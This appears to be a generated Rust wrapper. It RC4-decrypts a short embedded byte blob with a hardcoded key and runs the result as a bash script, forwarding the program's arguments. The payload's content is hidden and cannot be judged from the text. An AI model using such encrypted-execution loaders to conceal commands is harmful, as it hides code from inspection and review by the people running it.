
use std::io;
use std::iter::repeat;
use std::io::Write;
use std::process;
use std::process::{Command, Stdio};
use std::env;

pub struct Arc4 {
    i: u8,
    j: u8,
    state: [u8; 256],
}

impl Arc4 {
    pub fn new(key: &[u8]) -> Arc4 {
        assert!(key.len() >= 1 && key.len() <= 256);
        let mut rc4 = Arc4 {
            i: 0,
            j: 0,
            state: [0; 256],
        };
        for (i, x) in rc4.state.iter_mut().enumerate() {
            *x = i as u8;
        }
        let mut j: u8 = 0;
        for i in 0..256 {
            j = j
                .wrapping_add(rc4.state[i])
                .wrapping_add(key[i % key.len()]);
            rc4.state.swap(i, j as usize);
        }
        rc4
    }
    fn next(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.state[self.i as usize]);
        self.state.swap(self.i as usize, self.j as usize);
        let k = self.state
            [(self.state[self.i as usize].wrapping_add(self.state[self.j as usize])) as usize];
        k
    }

    fn encode_vec(&mut self, input: &[u8], output: &mut [u8]) {
        assert!(input.len() == output.len());
        for (x, y) in input.iter().zip(output.iter_mut()) {
            *y = *x ^ self.next();
        }
    }

    pub fn trans_vec(&mut self, input: &Vec<u8>) -> Vec<u8> {
        let mut out: Vec<u8> = repeat(0).take(input.len()).collect();
        self.encode_vec(input, &mut out);
        return out.to_vec();
    }

    pub fn trans_str(&mut self, str: &String) -> Vec<u8> {
        return self.trans_vec(&str.as_bytes().to_vec());
    }
}

fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
    let prog = format!("{}", prog.to_owned());
    //println!("{}", prog);
    let opt = if iterp == "ruby" { "-e" } else { "-c" };
    let output = Command::new(iterp)
        .arg(opt)
        .arg(prog)
        .args(args)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("failed to execute process");
    //println!("status: {}", output.status.code().unwrap());
    std::process::exit(output.status.code().unwrap());
}

fn main() {
    let prog = vec![145, 126, 112, 210, 232, 40, 219, 41, 0, 54, 36, 203, 138, 142, 246, 57, 239, 212, 254, 92, 195, 152, 128, 97, 30, 72, 160, 79, 51, 179, 52, 129, 28, 53, 46, 220, 56, 240, 32, 40, 183, 155, 226, 89, 236, 200, 249, 129, 199, 129, 194, 230, 249, 95, 186, 19, 81, 30, 76, 103, 80, 24, 129, 159, 97, 167, 116, 153, 230, 250, 18, 137, 167];
    let rand_key = "stUNDihN04xyU5YHP4cZmo5cjaauCy44Q0KLTOEOcAqqefQKgXYDE49vZh3n0AdYuX60GLVKSvvg1dyjJoHghalRv7DDtF3aupb46dmZdxjP3LvJOcAfoO3ZImfUiZY8";
    let pass = "";
    let iterp = "bash";

    if pass.len() != 0 {
        let mut input = String::new();
        print!("Password: ");
        io::stdout().flush().ok();
        io::stdin()
            .read_line(&mut input)
            .ok()
            .expect("Couldn't read password");
        if input.trim() != pass {
            println!("Invalid password!");
            process::exit(1);
        }
    }
    let prog_vec = Arc4::new(rand_key.to_string().as_bytes()).trans_vec(&prog);
    let prog_str = String::from_utf8(prog_vec).unwrap();
    //println!("running ...:\n {}", prog_str);
    let mut args = env::args().collect::<Vec<_>>();
    args.drain(0..1);
    run_process(&iterp.to_string(), &prog_str, &args);
}
